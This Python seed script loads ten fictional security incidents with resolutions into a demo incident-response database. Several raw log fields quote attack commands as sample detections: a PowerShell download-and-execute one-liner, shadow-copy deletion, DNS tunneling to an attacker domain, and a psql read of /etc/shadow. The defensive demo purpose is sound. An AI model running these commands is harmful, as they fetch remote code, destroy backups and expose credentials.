import datetime
import json
from sqlalchemy.orm import Session
from app.models.models import Incident, IncidentEvent, IncidentAnalysis, IncidentResolution, AgentExecution, MemoryReference
from app.services.database import SessionLocal, init_db

SEED_INCIDENTS = [
    {
        "id": "INC-1001",
        "title": "Unauthorized S3 Bucket Exfiltration",
        "description": "AWS CloudTrail alert flagged bulk GET requests from an unapproved AWS IAM user account 'infra-backup-temp' downloading 1.2 GB of financial audit logs.",
        "severity": "HIGH",
        "status": "RESOLVED",
        "source_ip": "198.51.100.12",
        "dest_ip": "192.0.2.80",
        "affected_account": "infra-backup-temp",
        "affected_service": "AWS S3 Financial Audit Bucket",
        "event_type": "Data Exfiltration",
        "raw_logs": "2026-08-10 10:14:22 CloudTrail: GetObject on bucket audit-logs-2026 by infra-backup-temp",
        "additional_context": "Legacy backup IAM key was left active without rotation.",
        "resolution": {
            "root_cause": "Exposed IAM long-term access key in public GitHub repository",
            "actions_taken": "Deleted IAM access key, attached deny-all policy to bucket, rotated root secrets",
            "remediation": "Revoke IAM key immediately, enable AWS Secrets Manager key rotation, audit repository commit history",
            "outcome": "Exfiltration contained within 25 minutes; no customer PII exposed",
            "analyst_feedback": "Immediate key revocation prevented secondary bucket enumeration.",
            "hindsight_memory_id": "mem-inc-1001-a1b2"
        }
    },
    {
        "id": "INC-1002",
        "title": "Brute Force Password Spray on VPN Gateway",
        "description": "Perimeter firewall detected 4,200 failed RADIUS authentication attempts across 350 active employee username accounts originating from a distributed proxy network.",
        "severity": "MEDIUM",
        "status": "RESOLVED",
        "source_ip": "203.0.113.44",
        "dest_ip": "192.0.2.1",
        "affected_account": "multiple_corporate_users",
        "affected_service": "Palo Alto GlobalProtect VPN",
        "event_type": "Brute-force login attempts",
        "raw_logs": "2026-08-14 02:00:15 RADIUS [WARN] Password spray attack pattern identified from IP range 203.0.113.0/24",
        "additional_context": "MFA enforced on all accounts; 3 accounts locked out automatically.",
        "resolution": {
            "root_cause": "External password spray targeting accounts without FIDO2 hardware tokens",
            "actions_taken": "Enforced geo-blocking on VPN gateway, reset locked account passwords, enabled push notification MFA",
            "remediation": "Apply perimeter rate limiting on RADIUS auth, enforce mandatory password change for affected users",
            "outcome": "Zero unauthorized VPN accesses achieved",
            "analyst_feedback": "Rate limiting on GlobalProtect gateway stopped spray within 5 minutes.",
            "hindsight_memory_id": "mem-inc-1002-c3d4"
        }
    },
    {
        "id": "INC-1003",
        "title": "Suspicious PowerShell Execution on Domain Controller",
        "description": "Active Directory Domain Controller DC-01 generated Event ID 4688: Command line invocation of Invoke-Mimikatz downloading LSASS process memory dump.",
        "severity": "CRITICAL",
        "status": "RESOLVED",
        "source_ip": "192.0.2.15",
        "dest_ip": "192.0.2.20",
        "affected_account": "DOMAIN\\svc_mgmt",
        "affected_service": "Active Directory Domain Services",
        "event_type": "Malware execution",
        "raw_logs": "2026-08-20 16:45:00 WinEventLog 4688: powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/m.ps1')",
        "additional_context": "Service account possessed Domain Admin privileges.",
        "resolution": {
            "root_cause": "Compromised management workstation via spear-phishing payload",
            "actions_taken": "Isolated DC-01 management interface, revoked Domain Admin credentials for svc_mgmt, deployed LSASS Credential Guard",
            "remediation": "Isolate host immediately, reset KRBTGT double password, enforce LAPS on all workstations",
            "outcome": "Domain trust restored; lateral movement blocked",
            "analyst_feedback": "Host isolation prevented Active Directory database extraction.",
            "hindsight_memory_id": "mem-inc-1003-e5f6"
        }
    },
    {
        "id": "INC-1004",
        "title": "Kubernetes API Cluster Impersonation",
        "description": "K8s audit log generated alert for anonymous serviceaccount binding cluster-admin role in production namespace 'payments'.",
        "severity": "HIGH",
        "status": "RESOLVED",
        "source_ip": "198.51.100.90",
        "dest_ip": "192.0.2.90",
        "affected_account": "system:serviceaccount:payments:default",
        "affected_service": "Kubernetes Production API Server",
        "event_type": "Privilege Escalation",
        "raw_logs": "2026-09-01 11:10:00 K8sAudit: create ClusterRoleBinding payment-admin-binding",
        "additional_context": "Vulnerable Helm chart exposed unauthenticated API endpoint.",
        "resolution": {
            "root_cause": "Misconfigured ClusterRoleBinding in deployed Helm release",
            "actions_taken": "Deleted rogue ClusterRoleBinding, patched Helm chart RBAC manifest, restricted K8s API to internal VPN",
            "remediation": "Enforce Gatekeeper RBAC validation rules, remove default serviceaccount admin privileges",
            "outcome": "K8s cluster RBAC secured; container images scanned",
            "analyst_feedback": "OPA Gatekeeper rule prevented recurrence during redeployments.",
            "hindsight_memory_id": "mem-inc-1004-g7h8"
        }
    },
    {
        "id": "INC-1005",
        "title": "Cobalt Strike Beacon Detection on Web Server",
        "description": "Network EDR sensor detected HTTP POST C2 heartbeats to external domain 'update-check-cdn.com' every 60 seconds from Nginx reverse proxy.",
        "severity": "CRITICAL",
        "status": "RESOLVED",
        "source_ip": "192.0.2.45",
        "dest_ip": "198.51.100.155",
        "affected_account": "www-data",
        "affected_service": "Nginx Frontend Web Proxy",
        "event_type": "Malware execution",
        "raw_logs": "2026-09-08 22:14:00 Suricata: ET MALWARE Cobalt Strike Beacon HTTP Activity",
        "additional_context": "Log4j RCE vulnerability exploited on backend Java microservice.",
        "resolution": {
            "root_cause": "Unpatched CVE-2021-44228 (Log4j) vulnerability in web API container",
            "actions_taken": "Terminated web container, upgraded Log4j dependency to 2.17.1, blocked C2 IP at perimeter",
            "remediation": "Update vulnerable Java binaries, deploy WAF virtual patch rules, terminate C2 beacon process",
            "outcome": "Beacon process killed; no persistence mechanisms established",
            "analyst_feedback": "WAF Log4j inspection rules stopped inbound exploit attempts.",
            "hindsight_memory_id": "mem-inc-1005-i9j0"
        }
    },
    {
        "id": "INC-1006",
        "title": "Database Exfiltration via SQL Injection",
        "description": "Web Application Firewall logged UNION SELECT payload targeting public user profile endpoint resulting in 85,000 user hash records returned.",
        "severity": "HIGH",
        "status": "RESOLVED",
        "source_ip": "203.0.113.110",
        "dest_ip": "192.0.2.10",
        "affected_account": "app_web_db",
        "affected_service": "MySQL User Database",
        "event_type": "Unauthorized Access",
        "raw_logs": "2026-09-12 04:30:11 ModSecurity: Access denied with code 403 (SQLi UNION SELECT detected)",
        "additional_context": "Legacy PHP API script bypassed parameterized ORM queries.",
        "resolution": {
            "root_cause": "Unsanitized dynamic string concatenation in search API endpoint",
            "actions_taken": "Refactored endpoint to use PDO parameterized queries, mandated password hash reset for users",
            "remediation": "Enforce parameterized SQL queries across codebase, restrict database account SELECT permissions",
            "outcome": "API vulnerability patched within 2 hours",
            "analyst_feedback": "Replacing raw SQL with PDO bindings resolved root vulnerability.",
            "hindsight_memory_id": "mem-inc-1006-k1l2"
        }
    },
    {
        "id": "INC-1007",
        "title": "Ransomware Staging via Compromised Remote Desktop",
        "description": "SOC analyst identified shadow copy deletion commands (`vssadmin delete shadows /all`) executed via RDP session on file server FS-02.",
        "severity": "CRITICAL",
        "status": "RESOLVED",
        "source_ip": "198.51.100.220",
        "dest_ip": "192.0.2.75",
        "affected_account": "Administrator",
        "affected_service": "Windows File Server FS-02",
        "event_type": "Malware execution",
        "raw_logs": "2026-09-18 19:00:00 Process Creation: vssadmin.exe delete shadows /all /quiet",
        "additional_context": "Direct RDP port 3389 exposed to internet without MFA.",
        "resolution": {
            "root_cause": "Internet-exposed RDP port 3389 with weak administrator credentials",
            "actions_taken": "Shut down public RDP port 3389, isolated FS-02 host from network, restored files from immutable cloud backup",
            "remediation": "Close public RDP ports, mandate VPN + MFA for remote desktop access, enforce immutable volume snapshots",
            "outcome": "Ransomware execution halted prior to encryption phase",
            "analyst_feedback": "Immutable snapshots enabled complete recovery without data loss.",
            "hindsight_memory_id": "mem-inc-1007-m3n4"
        }
    },
    {
        "id": "INC-1008",
        "title": "Malicious Insider Source Code Download",
        "description": "GitLab security audit logged 45 core repository clones within 10 minutes by departing senior developer account 'dev_jdoe'.",
        "severity": "MEDIUM",
        "status": "RESOLVED",
        "source_ip": "198.51.100.65",
        "dest_ip": "192.0.2.120",
        "affected_account": "dev_jdoe",
        "affected_service": "GitLab Enterprise Server",
        "event_type": "Data Exfiltration",
        "raw_logs": "2026-09-22 15:12:00 GitLab Audit: user dev_jdoe bulk cloned repository group 'proprietary-core'",
        "additional_context": "Employee offboarding ticket was pending HR approval.",
        "resolution": {
            "root_cause": "Delayed HR offboarding credential revocation",
            "actions_taken": "Suspended GitLab user account immediately, invalidated SSH keys, issued legal hold notice",
            "remediation": "Automate instant HR offboarding token invalidation via IDP webhook integration",
            "outcome": "Access revoked; code access logs audited",
            "analyst_feedback": "Automating HR webhook offboarding prevents post-resignation exfiltration.",
            "hindsight_memory_id": "mem-inc-1008-o5p6"
        }
    },
    {
        "id": "INC-1009",
        "title": "DNS Tunneling Data Leak",
        "description": "CoreDNS server recorded 15,000 unusual TXT record queries resolving to domain 'data-drop.attacker-dns.org' containing base64 encoded strings.",
        "severity": "HIGH",
        "status": "RESOLVED",
        "source_ip": "192.0.2.180",
        "dest_ip": "198.51.100.250",
        "affected_account": "system_dns_resolver",
        "affected_service": "Internal CoreDNS Cluster",
        "event_type": "Data Exfiltration",
        "raw_logs": "2026-09-24 13:40:00 DNSLog: TXT query aW52b2ljZV9kYXRhXzIwMjY=.data-drop.attacker-dns.org",
        "additional_context": "Host workstation infected via malicious email PDF macro.",
        "resolution": {
            "root_cause": "DNS tunneling payload executing on compromised finance endpoint",
            "actions_taken": "Blocked authoritative domain at DNS Sinkhole, re-imaged endpoint, enabled Infoblox DNS threat intelligence",
            "remediation": "Enable DNS inspection and filtering, block high-entropy TXT record requests to unknown TLDs",
            "outcome": "Exfiltration channel blocked; endpoint rebuilt",
            "analyst_feedback": "DNS Sinkholing cut off exfiltration payload immediately.",
            "hindsight_memory_id": "mem-inc-1009-q7r8"
        }
    },
    {
        "id": "INC-1042",
        "title": "Multiple Failed Logins Followed by DB Access (Incident #1)",
        "description": "System logged 17 consecutive SSH authentication failures from IP 198.51.100.45 followed by a successful authentication for service account 'svc_db_sync'. Immediately following login, uncharacteristic PostgreSQL administrative query commands were executed.",
        "severity": "HIGH",
        "status": "OPEN",
        "source_ip": "198.51.100.45",
        "dest_ip": "192.0.2.10",
        "affected_account": "svc_db_sync",
        "affected_service": "PostgreSQL Production Cluster",
        "event_type": "Credential Compromise",
        "raw_logs": """2026-09-28 08:14:02 sshd[4412]: Failed password for invalid user admin from 198.51.100.45 port 51022 ssh2
2026-09-28 08:14:05 sshd[4415]: Failed password for invalid user root from 198.51.100.45 port 51024 ssh2
2026-09-28 08:14:09 sshd[4418]: Failed password for user svc_db_sync from 198.51.100.45 port 51028 ssh2
2026-09-28 08:15:11 sshd[4490]: Accepted password for svc_db_sync from 198.51.100.45 port 51099 ssh2
2026-09-28 08:15:14 sudo: svc_db_sync : TTY=pts/1 ; PWD=/home/svc_db_sync ; USER=postgres ; COMMAND=/usr/bin/psql -U postgres -c SELECT pg_read_file('/etc/shadow');""",
        "additional_context": "Service account svc_db_sync is normally restricted to automated batch jobs executed from internal subnet 192.0.2.0/24."
    }
]

def seed_database(db: Session) -> int:
    init_db()
    count = 0
    for inc_data in SEED_INCIDENTS:
        existing = db.query(Incident).filter(Incident.id == inc_data["id"]).first()
        if existing:
            continue

        res_data = inc_data.get("resolution")
        incident = Incident(
            id=inc_data["id"],
            title=inc_data["title"],
            description=inc_data["description"],
            severity=inc_data["severity"],
            status=inc_data["status"],
            source_ip=inc_data.get("source_ip"),
            dest_ip=inc_data.get("dest_ip"),
            affected_account=inc_data.get("affected_account"),
            affected_service=inc_data.get("affected_service"),
            event_type=inc_data.get("event_type"),
            raw_logs=inc_data.get("raw_logs"),
            additional_context=inc_data.get("additional_context"),
            is_demo=True,
            created_at=datetime.datetime.utcnow(),
            updated_at=datetime.datetime.utcnow()
        )
        db.add(incident)

        # Create basic analysis for resolved ones
        if res_data:
            analysis = IncidentAnalysis(
                incident_id=inc_data["id"],
                severity=inc_data["severity"],
                incident_type=inc_data.get("event_type", "Security Event"),
                confidence=0.92,
                summary=inc_data["description"],
                indicators_json=json.dumps([f"Source IP: {inc_data.get('source_ip')}", f"Account: {inc_data.get('affected_account')}"]),
                attack_techniques_json=json.dumps(["T1078 - Valid Accounts", "T1068 - Privilege Escalation"]),
                possible_root_causes_json=json.dumps([res_data["root_cause"]]),
                recommended_actions_json=json.dumps([res_data["remediation"]]),
                evidence_json=json.dumps([inc_data.get("raw_logs", "Logs available")]),
                memory_query=f"Find incidents involving {inc_data.get('affected_account')}",
                has_historical_memory=False
            )
            db.add(analysis)

            resolution = IncidentResolution(
                incident_id=inc_data["id"],
                root_cause=res_data["root_cause"],
                actions_taken=res_data["actions_taken"],
                remediation=res_data["remediation"],
                outcome=res_data["outcome"],
                analyst_feedback=res_data["analyst_feedback"],
                hindsight_memory_id=res_data["hindsight_memory_id"]
            )
            db.add(resolution)

        count += 1

    db.commit()
    return count

if __name__ == "__main__":
    db = SessionLocal()
    added = seed_database(db)
    print(f"Seeded {added} incidents into database.")
    db.close()
